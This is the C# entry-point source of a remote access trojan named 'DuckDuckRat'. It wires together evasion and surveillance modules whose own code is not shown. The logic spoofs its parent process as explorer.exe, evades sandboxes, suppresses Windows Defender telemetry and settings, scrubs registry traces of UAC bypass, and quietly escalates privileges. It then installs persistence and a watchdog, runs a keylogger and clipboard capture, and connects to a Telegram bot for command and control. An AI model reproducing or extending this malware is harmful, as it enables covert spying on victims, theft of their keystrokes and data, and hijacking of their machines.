using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using DuckDuckRat;
using DuckDuckRat.Modules;
using DuckDuckRat.Defense;
using DuckDuckRat.Modules;

namespace DuckDuckRat
{
    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "GetModuleFileNameW")]
        private static extern uint Win32_GetModuleFileName(IntPtr hModule, [Out] StringBuilder lpFilename, uint nSize);

        private static Mutex? _mutex;

        private static void DebugLog(string msg) => SafetyManager.Log(msg);
        private static void Log(string msg) => SafetyManager.Log(msg);

        public static async Task Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            AppDomain.CurrentDomain.UnhandledException += (s, e) => {
                DebugLog($"FATAL CRASH: {e.ExceptionObject}");
            };
            TaskScheduler.UnobservedTaskException += (s, e) => {
                DebugLog($"UNOBSERVED TASK ERROR: {e.Exception}");
                e.SetObserved();
            };

            // [STEP 0] Proactive Registry Sanitization (Clean old indicators)
            RegistryCleanup.SanitizeUacTraces();

            // [STEP 1] Mutex Acquisition (Path-Specific to avoid Cross-Service Conflicts)
            bool createdNew;
            string mutexName = GetStableMutexName();
            _mutex = new Mutex(true, mutexName, out createdNew);

            if (!createdNew)
            {
                // [RED TEAM] Silent Backoff: Don't fight for the Telegram session if an instance is already active.
                // This prevents the "Conflict: terminated by other getUpdates request" error.
                DebugLog("Mutex conflict detected. Strategic backoff (5s)...");
                Thread.Sleep(5000);
                return; 
            }
            DebugLog($"Mutex acquired: {mutexName}.");

            // [GHOST] Self-Respawn with PPID Spoofing (explorer.exe)
            string cmdLine = Environment.CommandLine;
            bool isGhost = cmdLine.Contains("--ghost");
            bool isInjected = ElevationService.IsInjected();
            string guardianArg = args.Length > 0 && args[0].StartsWith("--guard") ? args[0] : null;

            if (!isGhost && !isInjected && guardianArg == null) {
                string selfPath = Process.GetCurrentProcess().MainModule.FileName;
                if (ElevationService.SpawnWithSpoof(selfPath, "--ghost", "explorer")) {
                    Environment.Exit(0);
                    return;
                }
            }

            // [PHASE 3] Advanced Anti-Sandbox Check (Black Edition)
            if (AntiAnalysis.CheckAll())
            {
                AntiAnalysis.EnterSleepMode(); 
                return;
            }

            // [V6.12] Initialize Crypto Keys first for reliable Vault access
            SafetyManager.StartupKeys();

            // [RED TEAM HARDENING] Silence Defender Telemetry Immediately
            SafetyManager.ApplyStealthPatches();

            DebugLog($"Startup [GHOST]: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
            int fromPid = 0;
            string fromPath = "";
            
            string fromArg = Array.Find(args, a => a.StartsWith("--from="));
            if (fromArg != null && int.TryParse(fromArg.Split('=')[1], out var pidValue)) fromPid = pidValue;

            string gArg = Array.Find(args, a => a.StartsWith("--guardian="));
            if (gArg != null)
            {
                // Format: --guardian=PID:Path
                var parts = gArg.Split('=')[1].Split(':');
                if (parts.Length >= 2 && int.TryParse(parts[0], out var gPid))
                {
                    fromPid = gPid;
                    fromPath = parts[1];
                    if (parts.Length > 2) fromPath = string.Join(":", parts, 1, parts.Length - 1);
                }
            }

            if (isInjected || guardianArg != null)
            {
                DebugLog($"Running as {(isInjected ? "INJECTED" : "GUARDIAN")} child from PID {fromPid}.");
                if (fromPid > 0) 
                {
                    WatchdogManager.Start(fromPid, fromPath);
                }
            }

            try { ResourceModule.ExtractAll(); }
            catch (Exception ex) { 
                DebugLog($"Resource extraction failed: {ex.Message}"); 
                return; 
            }

            SafetyManager.AntiBehavior();

            // UAC Child Signaling
            if (Array.Exists(args, a => a == "--uac-child") || isInjected)
            {
                try 
                {
                    string evArg = Array.Find(args, a => a.StartsWith("--event="));
                    string evName = evArg != null ? evArg.Split('=')[1] : "Global\\EmoCore_Success";
                    using var successEvent = new EventWaitHandle(false, EventResetMode.ManualReset, evName);
                    successEvent.Set();
                    DebugLog($"Signal sent to: {evName}");
                } catch { }
            }

            // Lazy UAC Elevation
            if (!isInjected && !ElevationService.IsAdmin())
            {
                _ = Task.Run(async () =>
                {
                    try {
                        Random r = new Random();
                        await Task.Delay(r.Next(30000, 60000));
                        var sb = new StringBuilder(1024);
                        Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
                        string selfPath = sb.ToString();
                        _mutex?.Dispose();
                        if (ElevationService.RequestElevation(selfPath)) Process.GetCurrentProcess().Kill();
                        _mutex = new Mutex(true, GetStableMutexName(), out _);
                    } catch { }
                });
            }
            else if (ElevationService.IsAdmin())
            {
                DebugLog("Running as ADMIN. Applying Defender suppressions.");
                SafetyManager.ApplyDefenderSettings();
            }

            // [SENTINEL] Ghost Mode Setup (Persistence & Guardian)
            PersistenceService.InstallPersistence();
            if (guardianArg == null && !isInjected)
            {
                TwinService.StartGuardian();
            }
            
            // [SILENT START] Initialize background monitors once
            try { KeyloggerModule.Start(); } catch (Exception ex) { DebugLog($"Keylogger startup error: {ex.Message}"); }
            try { ClipboardModule.Start(); } catch (Exception ex) { DebugLog($"Clipboard startup error: {ex.Message}"); }

            // --- Resilience Loop ---
            while (true)
            {
                try 
                {
                    DebugLog("Initializing core services via Vault...");
                    ConfigManager.Load();
                    
                    // [ORBITAL] Silence Period: Give Mutex logic time to kill old instances
                    // and let the OS release port/session handles.
                    await Task.Delay(3000); 

                    string token = SafetyManager.Resolve("BOT_TOKEN_1");
                    string adminId = SafetyManager.Resolve("ADMIN_ID");
                    var httpClient = await ProxyTunnel.GetBestHttpClient();
                    var orchestrator = new BotOrchestrator(token, adminId, httpClient);
                    
                    // [SENTINEL] Apotheosis: Total Memory Cleanse
                    SafetyManager.ClearSecrets();

                    DebugLog("DUCK DUCK RAT v1 Ghost Mode Active.");
                    await orchestrator.StartAsync();
                }
                catch (Exception ex) 
                { 
                    DebugLog($"RESILIENCE ERROR: {ex.Message}. Restarting in 60s...");
                    await Task.Delay(60000); // Backoff before restart
                }
            }
        }

        private static string GetStableMutexName()
        {
            try {
                // [RED TEAM] Path-bound Mutex: prevents conflicts if multiple builds are running from different folders.
                string path = Process.GetCurrentProcess().MainModule.FileName.ToLower();
                string seed = Environment.MachineName + Environment.UserName + path;
                
                using var sha = System.Security.Cryptography.SHA256.Create();
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(seed));
                return "Global\\" + new Guid(hash.AsSpan(0, 16).ToArray()).ToString("B").ToUpper();
            } catch { return "Global\\{C2F9B8A1-4D3E-4B02-8F71-A9D6E5C3B2A1}"; }
        }
    }
}


